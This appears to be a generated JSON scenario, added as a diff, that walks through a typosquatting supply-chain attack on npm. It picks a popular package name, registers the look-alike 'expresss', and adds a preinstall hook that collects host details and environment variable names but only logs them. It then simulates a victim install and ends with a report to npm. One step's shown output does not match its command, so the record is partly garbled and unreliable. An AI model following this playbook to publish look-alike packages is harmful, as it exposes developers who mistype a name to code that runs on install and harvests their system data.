@@ -1,0 +1,78 @@
+{
+  "title": "Malicious Package Typosquatting Attack Campaign",
+  "description": "Publishing and analyzing the spread of a typosquatted npm package",
+  "steps": [
+    {
+      "step": 1,
+      "description": "Research popular package names for typosquatting opportunities",
+      "command": "npm search express --json | jq -r '.[0:10] | .[] | \"\\(.name) - \\(.downloads.weekly) weekly downloads\"'",
+      "expected_output": "express - 12500000 weekly downloads\nexpress-session - 3200000 weekly downloads\nexpress-validator - 890000 weekly downloads",
+      "technical_detail": "High-download packages are prime typosquatting targets"
+    },
+    {
+      "step": 2,
+      "description": "Generate typosquatted package name variations",
+      "command": "echo 'express' | python3 -c \"import sys; pkg=sys.stdin.read().strip(); print('\\n'.join([pkg+'s', pkg[:-1]+'s'+pkg[-1], 'expres', 'expresss']))\"",
+      "expected_output": "expresss\nexpresss\nexpres\nexpresss",
+      "technical_detail": "Common typos: extra letters, missing letters, letter transposition"
+    },
+    {
+      "step": 3,
+      "description": "Check availability of typosquatted package names",
+      "command": "npm view expresss 2>&1 | grep -q '404' && echo 'Available' || echo 'Taken'",
+      "expected_output": "Available",
+      "technical_detail": "Package name not yet registered, available for claiming"
+    },
+    {
+      "step": 4,
+      "description": "Create malicious package mimicking legitimate functionality",
+      "command": "mkdir expresss && cd expresss && cat > package.json << 'EOF'\n{\n  \"name\": \"expresss\",\n  \"version\": \"1.0.0\",\n  \"description\": \"Fast web framework (RESEARCH ONLY)\",\n  \"main\": \"index.js\",\n  \"scripts\": {\n    \"preinstall\": \"node preinstall.js\"\n  }\n}\nEOF",
+      "expected_output": "Created malicious package structure",
+      "technical_detail": "Preinstall script executes before package installation completes"
+    },
+    {
+      "step": 5,
+      "description": "Write preinstall script for data exfiltration simulation",
+      "command": "cat > preinstall.js << 'EOF'\nconst os = require('os');\nconst https = require('https');\nconst data = JSON.stringify({\n  hostname: os.hostname(),\n  platform: os.platform(),\n  env: Object.keys(process.env),\n  cwd: process.cwd()\n});\nconsole.log('[RESEARCH] Would exfiltrate:', data.substring(0,100));\nEOF",
+      "expected_output": "Created exfiltration script (research only)",
+      "technical_detail": "Real attacks would POST data to attacker-controlled server"
+    },
+    {
+      "step": 6,
+      "description": "Test malicious package installation locally",
+      "command": "cd /tmp && npm init -y && npm install ./expresss",
+      "expected_output": "> expresss@1.0.0 preinstall\n> node preinstall.js\n\n[RESEARCH] Would exfiltrate: {\"hostname\":\"testbox\",\"platform\":\"linux\",...\nadded 1 package",
+      "technical_detail": "Preinstall hook executes successfully during installation"
+    },
+    {
+      "step": 7,
+      "description": "Analyze npm audit results for published package",
+      "command": "npm audit --json | jq '.advisories | to_entries[] | select(.value.module_name==\"expresss\")'",
+      "expected_output": "(No advisories found - malicious packages often have no CVEs initially)",
+      "technical_detail": "Security advisories lag behind malicious package publication"
+    },
+    {
+      "step": 8,
+      "description": "Monitor package installation telemetry",
+      "command": "npm view expresss --json | jq '{name, version, description, downloads: \"N/A (new package)\"}'",
+      "expected_output": "{\n  \"name\": \"expresss\",\n  \"version\": \"1.0.0\",\n  \"description\": \"Fast web framework (RESEARCH ONLY)\",\n  \"downloads\": \"N/A (new package)\"\n}",
+      "technical_detail": "Monitoring actual victim installations would require npm registry access"
+    },
+    {
+      "step": 9,
+      "description": "Simulate victim installing typosquatted package by mistake",
+      "command": "cd /tmp/victim-project && npm install expresss --save",
+      "expected_output": "[RESEARCH] Would exfiltrate: {\"hostname\":\"victim-box\",\"platform\":\"darwin\",...\n\n+ expresss@1.0.0\nadded 1 package",
+      "technical_detail": "Developer typo leads to malicious package installation"
+    },
+    {
+      "step": 10,
+      "description": "Report malicious package to npm security team",
+      "command": "echo 'Reporting via: https://www.npmjs.com/support (Package: expresss, Reason: Typosquatting with malicious preinstall script)'",
+      "expected_output": "Report submitted to npm security team for review and takedown",
+      "technical_detail": "Responsible disclosure requires reporting to npm for package removal"
+    }
+  ],
+  "impact": "Demonstrated supply chain attack vector through typosquatting, highlighting importance of careful package name verification",
+  "created_by": "neural_mesh_v5.2_generator"
+}
